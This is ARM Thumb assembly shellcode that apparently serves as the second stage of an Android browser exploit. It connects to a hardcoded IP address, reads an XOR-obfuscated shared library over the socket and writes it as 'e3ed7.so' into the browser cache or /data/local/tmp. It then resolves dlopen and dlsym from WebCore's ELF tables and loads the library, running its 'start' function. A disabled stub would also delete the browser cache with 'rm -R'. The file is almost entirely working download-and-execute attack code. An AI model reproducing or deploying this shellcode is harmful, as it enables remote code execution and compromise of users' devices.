.globl _start

_start:
	.code	16

	
	/* r1 is the address of webcore struct soinfo */
	/* todo change sp before ! */
	sub	sp, #100
	push	{r1}

	
	/* find browser cache dir */
	/* r10 holds the start of the folder string */
	/* r11 holds the end of the folder string */
	adr	r0, app_cache
	mov	r7, #12
	svc	1
	
	adr	r2, app_cache
	mov	r10, r2
	add	r2, #31
	mov	r11, r2

	cmp	r0, #0
	beq	fork

	adr	r0, data_data
	mov	r7, #12
	svc	1

	/* if couldn't find cache dir, try /data/local/tmp  */
	adr	r2, data_data
	mov	r10, r2
	add	r2, #31
	mov	r11, r2

	cmp	r0, #0
	beq	fork

	
	adr	r0,  data_tmp
	mov	r7,  #12
	svc	1
	
	adr	r2,  data_tmp
	mov	r10, r2
	add	r2,  #16
	mov	r11, r2

	cmp	r0,  #0
	beq	socket		/* for data_tmp don't remove ./cache folder */
	
	/* bne	exit */
	mov	r7, #1
	svc	1


fork:
	b 	socket /* REMOVE */
	/*nop
	
	mov	r7, #2
	svc	1

	cmp	r0, #0
	bne	socket 
	
	/* execve(rm, [rm, -R, cache, 0], 0) */
	/*adr	r0, rm
	adr	r2, cache_relative
	adr	r1, recursive
	sub	r3, r3, r3
	push	{r0, r1, r2, r3}
	sub	r2, r2, r2
	mov	r1, sp
	mov	r7, #11
	svc	1 REMOVE COMMENTS*/ 
	

socket:

open_log:
	adr	r2, open_mode  
	ldrh	r2, [r2]
	adr	r1, open_flags
	ldrh	r1, [r1]
	adr	r0, log_filename
	mov	r7, #5
	svc	1	        /* open(filename,O_RDWR|O_CREAT|O_TRUNC[0001.0100.1000=1101],700) */
	push	{r0}

	
	/* socket(2, 1, 0) */
        mov     r0, #2
        mov     r1, #1
        sub     r2, r2, r2
        lsl     r7, r1, #8
        add     r7, r7, #25 
        svc     1

log_socket:
	/* write read number to log_buffer */
	mov	r0, r0
	adr	r1, log_buffer
	str	r0, [r1]

	/* write that number to log_filename */

	mov 	r2, #4		/* 4 bytes */
	pop	{r0}		/* fd */
	push 	{r0}
	mov	r7, #4
	svc	1

	
	
connect:
	mov     r6, r0	          /* r6 contains socket descriptor */
        adr     r1, sockaddr_dl   /* r1 points to sockaddr */
        mov     r2, #16
        add     r7, #2	          /* socket + 2 = 283 */
        svc     1	          /* connect(r0, &addr, 16) */

log_connect:
	/* write read number to log_buffer */
	mov	r0, r0
	adr	r1, log_buffer
	str	r0, [r1]

	/* write that number to log_filename */

	mov 	r2, #4		/* 4 bytes */
	pop	{r0}		/* fd */
	push 	{r0}
	mov	r7, #4
	svc	1

	
select:
	/* prepare readfs */
	
	mov	r0, #128
	sub	r1, r1
	adr	r2, readfs

memset_loop:
	str	r1, [r2]
	add	r2, #4
	sub	r0, #4
	cmp	r0, #0
	bge	memset_loop


	/* fd_set */
	adr	r1, readfs	


	.syntax unified

	movs	r7, #31
	ands	r7, r6
	asrs	r2, r6, #5
	movs	r3, #1
	lsls    r3, r7
	lsls	r2, r2, #2
	str	r3, [r2, r1]
	
	.syntax divided

	
	mov	r3, #0
	mov	r2, #0

	push	{r2}
	push    {r2}            /* tv null */
	

	mov	r0, r6		/* socket fd + 1 */
	add	r0, #1
	
	mov	r7, #142	/* select */
	svc	1
	pop	{r7}		/* clear tv on stack */
	pop	{r7}
	

open:	adr	r2, open_mode  
	ldrh	r2, [r2]
	adr	r1, open_flags
	ldrh	r1, [r1]
	adr	r0, filename
	mov	r7, #5
	svc	1	        /* open(filename,O_RDWR|O_CREAT|O_TRUNC[0001.0100.1000=1101],700) */
	mov	r8, r0		/* r8 holds file descriptor */


log_open:
	/* write read number to log_buffer */
	mov	r0, r8
	adr	r1, log_buffer
	str	r0, [r1]

	/* write that number to log_filename */

	mov 	r2, #4		/* 4 bytes */
	pop	{r0}		/* fd */
	push 	{r0}
	mov	r7, #4
	svc	1


	

	/* 5] read-write loop  */

	mov	r9, r6		/* from now on sockfd is r9 */
	mov	r6, #0		/* r6 now contains bytes written so far */
	
read:	adr	r2, buffer_size	/* size per read */
	ldrh	r2, [r2]
	adr	r1, buffer      /* r5 is ptr to buffer */
	ldr	r1, [r1]
	mov	r5, r1
	mov	r0, r9          /* sockfd */
	mov	r7, #3
	svc	1		/* read(int fd, void *buf, size_t count) */
	nop
	mov	r12, r0		/* r12 holds the number of bytes read */
	

	/* tos is log file handle */
	/* write(int fd, const void *buf, size_t count) */
	
log_read:
	/* write read number to log_buffer */
	adr	r1, log_buffer
	mov	r0, r12
	str	r0, [r1]

	/* write that number to log_filename */

	mov 	r2, #4		/* 4 bytes */
	pop	{r0}		/* fd */
	push 	{r0}
	mov	r7, #4
	svc	1

	mov	r0, r12
	cmp 	r0, #1		/* 0 eof, negative error, we write only if we've read something  */
	blt	close
	nop
	

setup:	adr	r1, key
	ldr	r1, [r1]	/* r1 holds the key */
	mov	r2, r5		/* r2 is ptr to buffer */

	mov	r3, #0		/* r3 holds number of bytes xored */
	
xor:	
	ldr	r0, [r2]
	eor	r0, r0, r1
	str	r0, [r2]
	
	add 	r3, r3, #4
	add	r2, r2, #4
	cmp	r3, r12
	blt	xor	

	
write:	mov	r2, r12		/* write only the number of bytes read */
	mov	r1, r5
	mov	r0, r8		
	mov	r7, #4	        /* write(int fd, const void *buf, size_t count) */
	svc	1
	
	add	r6, r0		/* update the number of bytes written so far */
	b	read
	
close:
	pop 	{r0} 	 /* pop logfile fd */
	
	/* close socketfd and filefd */
	mov	r0, r8
	mov	r7, #6
	svc	1

	mov	r0, r9
	mov	r7, #6
	svc	1


	b 	exit /* REMOVE */
	nop
	
	
	/* concat cache folder name with filename, r10 start, r11 end */
	/* e.g. "/app-cache/com.android.browser/cache/" + "e3ed7.so\0" */
	adr	r1, filename
	mov	r2, r11
	ldr	r0, [r1]
	str	r0, [r2]
	
	add	r1, #4
	add	r2, #4
	ldr	r0, [r1]
	str	r0, [r2]

	add	r1, #4
	add	r2, #4
	ldrb	r0, [r1]
	strb	r0, [r2]


	cmp	r6, #0          /* bail if no bytes have been written  */
	bgt	resolve_dl	/* skip resolve_dl */

	
/* ---------------------------------------------------------------------- */
/* exit for generic error handling - located here otherwise it may not be reachable thumb offset-wise */
exit:
	mov	r7, #1
	svc	1
/* ---------------------------------------------------------------------- */


resolve_dl:
	pop	{r1}

	mov	r6, r1		/* from now on r6 is & of webcoore soinfo*/

	add	r1, #140
	ldr	r2, [r1]
	mov	r12, r2		/* r12 = base address */
	
	add	r1, #32
	ldr	r2, [r1]
	mov	r8, r2		/* r8 = &strtab */

	add	r1, #4
	ldr	r2, [r1]
	mov	r9, r2		/* r9 = &symtab */


	add	r1, #24
	ldr	r2, [r1]
	mov	r11, r2		/* r11 = &plt_rel */

	adr	r0, dlsym_string
	bl	resolve_symbol
	add	r0, r12
	push 	{r0}

	adr	r0, dlopen_string
	bl	resolve_symbol
	add	r0, r12
	push	{r0}

	
	
run_export:			
	/* dlopen */
	mov	r0, r10		/* r10 is filename */
	mov	r1, #1	 	/* RTLD_NOW */
	pop	{r3}
	ldr	r3, [r3]
	blx	r3

	/* dlsym */
	adr	r1, export
	pop	{r3}
	ldr	r3, [r3]
	blx	r3

	mov	r4, r0

	adr	r0, ip
	ldr	r0, [r0]
	adr	r1, port
	ldrh	r1, [r1]
	cmp	r4, #0
	beq	exit
	blx	r4

	b	exit


/* ------------- SUB RESOLVE SYMBOL ------------------------ */	
	
	/* loop through symtab until dlopen/dlsym are found */
	/* search at max 1000 symtab entries */

	/*
	typedef struct {
		Elf32_Word	st_name  ;
		Elf32_Addr	st_value ;
		Elf32_Word	st_size	 ;
		unsigned char	st_info	 ;
		unsigned char	st_other ;
		Elf32_Half	st_shndx ;
	} Elf32_Sym;
	*/

/* return offset from base address of the got entry */
resolve_symbol:	
	
	mov	r4, r0
	
	/* r0 is ptr to current symtab entry */
	mov	r0, r9

	/* r5 is the index for symtab entries */
	mov	r7, #255
	lsl	r7, #4

	mov	r5, #0

symtab_next:

	/* increment index, check < 0xff0 */
	add	r5, #1
	cmp	r5, r7
	bge	bail_fail
	
	add	r0, #16
	
	
	ldr	r1, [r0]	/* r1 contains offset in strtab */
	add	r1, r8		/* offset + r8 strtab base */

	ldr	r3, [r1]
	ldr	r2, [r4]
	cmp	r2, r3
	bne	symtab_next

	add	r1, #4
	add	r4, #4
	ldrh	r3, [r1]
	ldrh	r2, [r4]
	cmp	r2, r3
	bne	symtab_next

	
	/*  add 	r1, #2
	    ldrb	r3, [r1]
	    cmp		r3, #0
	    bne	        symtab_next */


	/* r5 holds the index number */

	/*
	typedef struct { 
		Elf32_Addr r_offset;
		Elf32_Word r_info;
	} Elf32_Rel;
	*/

	/* a] take the index found in symtab - addr
	      then derive the r_info value in the plt_rel entry that we're looking for  as  ( addr << 8)

	   b] loop through the rel entries - max is plt_rel count in soinfo -
	      and compare each (r_info & 0x00) with  (addr << 8)
	*/

	lsl	r7, r5, #8

	mov	r0, r11			/* r0 is current ptr */
	sub	r0, r0, #4		/* r11 address of &plt_rel + offset to first index - 8 */
					/* (compensate with add 8 ) */

	
	/* r4 counter			  */
	/* r6 + 204 is plt_rel_count	  */
	mov	r4, r6
	add	r4, #204
	ldr	r4, [r4]

	
plt_rel_next:
	sub	r4, #1		/* check there're plt_rel left to check */
	cmp	r4, #0
	ble	bail_fail
	
	add	r0, #8
	
	ldr	r1, [r0]
	lsr	r1, #8
	lsl	r1, #8

	cmp 	r1, r7
	bne	plt_rel_next

	
	sub	r0, #4
	ldr	r0, [r0]
	bx	lr

bail_fail:
	mov	r0, #0
	bx	lr

	

/* data */
sockaddr_dl:	
		.align 2	               /* struct sockaddr */
 		.short 0x2	
		.short 0x3412
		.byte 192,168,69,131	

ip:		.byte	192,168,69,131
port:		.short	0x3412
	        .byte	1,1

	
open_mode:	.short 0x1c0  /*700 */
	        .byte  1,1
	
open_flags:	.short 0x242  /* O_RDWR|O_CREAT|O_TRUNC */
	        .byte  1,1
	
file_size:	.word 0x2d

filename:	.ascii "e3ed7.so\0"
	        .byte 1,1,1

app_cache:	.ascii "/app-cache/com.android.browser/\0"

data_data:	.ascii "/data/data/com.android.browser/\0"

data_tmp:	.ascii "/data/local/tmp/\0"
		.byte 1,1,1
		
cache_relative:	.ascii "./cache/webviewCache\0"
		.byte 1,1,1
	
rm:		.ascii "/system/bin/rm\0"
		.byte 1
	
recursive:	.ascii "-R\0"
		.byte 1

log_filename:	.ascii "lgo\0"

log_buffer:	.word 0x76543210
	
key:		.word 0x01234567
	
buffer_size:	.short 0x400
		.byte 1,1
	
export:
		.ascii "start\0"
	        .byte 1,1
dlopen_string:	.ascii "dlopen\0"
		.byte 1

dlsym_string:	.ascii "dlsym\0"
		.byte 1,1
	
buffer:		.word 0x50006000

readfs:		.byte 3,3,3,3
